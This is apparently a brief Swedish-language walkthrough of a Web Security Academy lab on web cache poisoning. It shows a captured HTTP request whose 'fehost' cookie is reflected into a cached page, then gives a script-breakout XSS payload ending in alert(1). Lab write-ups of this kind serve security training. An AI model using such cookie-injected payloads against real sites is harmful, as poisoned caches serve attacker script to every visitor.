
1. Inspektera requesten nedan och notera kakan:
```
GET /product?productId=1 HTTP/2
Host: 0a2d00be03e3809eaef41eee009c0089.web-security-academy.net
Cookie: session=swcv36Lbl3FRjWyP73trmZfnR05Fe0qz; fehost=prod-cache-01
Sec-Ch-Ua: "Chromium";v="129", "Not=A?Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2d00be03e3809eaef41eee009c0089.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

2. notera att `fehost` speglar sig i requesten och cachar sidan 
3. skapa en xss: 
   ```prod-cache-01"}</script><script>alert(1)</script><script>// ```

